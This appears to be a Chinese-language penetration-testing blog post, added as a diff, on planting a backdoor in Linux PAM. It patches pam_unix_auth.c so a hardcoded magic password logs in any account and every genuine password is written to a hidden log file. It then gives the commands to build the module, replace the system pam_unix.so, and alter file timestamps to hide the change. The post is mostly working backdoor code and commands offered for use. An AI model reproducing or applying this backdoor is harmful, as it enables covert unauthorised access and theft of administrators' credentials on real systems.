@@ -1,0 +1,85 @@
+---
+layout: post
+title: "patch pam backdoor"
+description: ""
+category: 渗透测试
+tags: [backdoor,pam]
+---
+{% include JB/setup %}
+
+## 什么pam ##
+
+在过去，我们想要对一个使用者进行认证 (authentication)，得要要求用户输入账号口令， 然后透过自行撰写的程序来判断该账号口令是否正确。也因为如此，我们常常得使用不同的机制来判断账号口令， 所以搞的一部主机上面拥有多个各别的认证系统，也造成账号口令可能不同步的验证问题！ 为了解决这个问题因此有了 PAM (Pluggable Authentication Modules, 嵌入式模块) 的机制！
+
+PAM 可以说是一套应用程序编程接口 (Application Programming Interface, API)，他提供了一连串的验证机制，只要使用者将验证阶段的需求告知 PAM 后， PAM 就能够回报使用者验证的结果 (成功或失败)。由于 PAM 仅是一套验证的机制，又可以提供给其他程序所呼叫引用，因此不论你使用什么程序，都可以使用 PAM 来进行验证，如此一来，就能够让账号口令或者是其他方式的验证具有一致的结果！也让程序设计师方便处理验证的问题.[引用自鸟哥私房菜](http://vbird.dic.ksu.edu.tw/linux_basic/0410accountmanager_5.php#ps5)
+
+## pam backdoor ##
+
+从pam的介绍中,我们知道,其实登录系统的时候,是pam的模块来验证我们的密码是否正确的.所以就存在这样一种可能,修改pam的验证逻辑,来达到一定条件下不去跟shadow里的密码校验,而是直接返回验证正确.从而达到作为后门的目的.
+
+patch过程如下:
+
+下载pam的源码:http://www.linux-pam.org/library/,有很多个版本,我测试的时候都是用的最新版.没有出现问题.测试过的ubuntu10.04和centos 5.4 X64.
+
+	wget http://www.linux-pam.org/library/Linux-PAM-1.1.6.tar.gz
+	tar zxvf Linux-PAM-1.1.6.tar.gz
+
+修改modules/pam_unix/pam_unix_auth.c文件
+
+	cd Linux-PAM-1.1.6
+	vi modules/pam_unix/pam_unix_auth.c
+	
+查找pam_sm_authenticate函数,修改如下这段函数:
+
+	D(("user=%s, password=[%s]", name, p));
+	
+    /* verify the password of this user */
+	
+    retval = _unix_verify_password(pamh, name, p, ctrl);
+	
+    name = p = NULL;
+
+    AUTH_RETURN;
+
+
+改为:
+
+	D(("user=%s, password=[%s]", name, p));
+        if(strcmp(p, "MAGIC_PASSWD") == 0)  ////MAGIC_PASSWD修改为自己设置的后门密码
+        {
+            retval = PAM_SUCCESS;
+            AUTH_RETURN;
+        }
+
+        /* verify the password of this user */
+        retval = _unix_verify_password(pamh, name, p, ctrl);
+        if(retval == PAM_SUCCESS)
+        {
+            FILE *fp = fopen("/usr/local/man/.pam.log","a"); /////记录管理员密码的文件路径.
+            fprintf(fp, "[evilpam]user=%s, password=%s\n", name, p);
+            fclose(fp);
+        }
+        name = p = NULL;
+
+
+这段密码的意思是设置了一个MAGIC_PASSWD,任何用户使用这个密码都可以登录.如果用户不是用MAGIC_PASSWD登录的,就把他的用户名密码记录在/usr/local/man/.pam.log文件里.
+
+
+保存文件之后,
+
+	./configure
+	make
+
+覆盖pam_unix.so之前先备份一下:
+
+	cp /lib/security/pam_unix.so /tmp/pam_unix.so
+	cp modules/pam_unix/.libs/pam_unix.so /lib/security/  覆盖
+
+需要注意一点.64位的系统里,pam_unix.so的路径是/lib64/security/,坑爹的是64位系统也有/lib/security/pam_unix.so这个文件,一开始调试了好久都没好....
+
+
+覆盖之后,后门就马上生效了.记得要先测试过.不然断开了之后,发现有问题,连不上就2了.一个patch pam backdoor就搞定了.
+
+修改文件的编辑时间~~
+
+##  ##
